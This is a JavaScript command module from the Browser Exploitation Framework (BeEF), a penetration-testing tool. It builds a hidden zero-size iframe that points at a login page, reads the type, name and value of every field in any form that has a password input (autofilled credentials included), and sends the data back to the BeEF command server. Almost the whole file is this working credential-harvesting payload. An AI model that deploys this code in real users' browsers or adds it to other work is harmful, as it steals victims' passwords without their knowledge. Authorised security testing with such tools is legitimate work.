//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var form_data = new Array();
	var login_url = "<%= @login_url %>";
	var internal_counter = 0;
	var timeout = 30;

	// create iframe
	iframe = document.createElement("iframe");
	iframe.setAttribute("id","credentials_container_<%= @command_id %>");
	iframe.setAttribute("src", login_url);
	iframe.setAttribute("style","display:none;visibility:hidden;border:none;height:0;width:0;");
	document.body.appendChild(iframe);

	// try to read form data from login page
	function waituntilok() {

		var iframe = document.getElementById("credentials_container_<%= @command_id %>");
		try {

			// check if login page is ready
			if (iframe.contentWindow.document.readyState != "complete") {
				if (internal_counter > timeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'form_data=Timeout after '+timeout+' seconds');
					document.body.removeChild(iframe);
				} else {
					internal_counter++;
					setTimeout(function() {waituntilok()},1000);
				}
				return;
			}

			// find all forms with a password input field
			for (var f=0; f < iframe.contentWindow.document.forms.length; f++) {
				for (var e=0; e < iframe.contentWindow.document.forms[f].elements.length; e++) {
					// return form data if it contains a password input field
					if (iframe.contentWindow.document.forms[f].elements[e].type == "password") {
						for (var i=0; i < iframe.contentWindow.document.forms[f].elements.length; i++) {
							form_data.push(new Array(iframe.contentWindow.document.forms[f].elements[i].type, iframe.contentWindow.document.forms[f].elements[i].name, iframe.contentWindow.document.forms[f].elements[i].value));
						}
						break;
					}
				}
			}

			// return results
			if (form_data.length) {
				// return form data
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'form_data='+JSON.stringify(form_data));
			} else {
				// return if no password input fields were found
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'form_data=Could not find any password input fields on '+login_url);
			}

		} catch (e) {
			// return if no forms were found or login page is cross-domain
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'form_data=Could not read form data from '+login_url);
		}
		document.body.removeChild(iframe);
	}

	// wait until the login page has loaded
	setTimeout(function() {waituntilok()},1000);

});

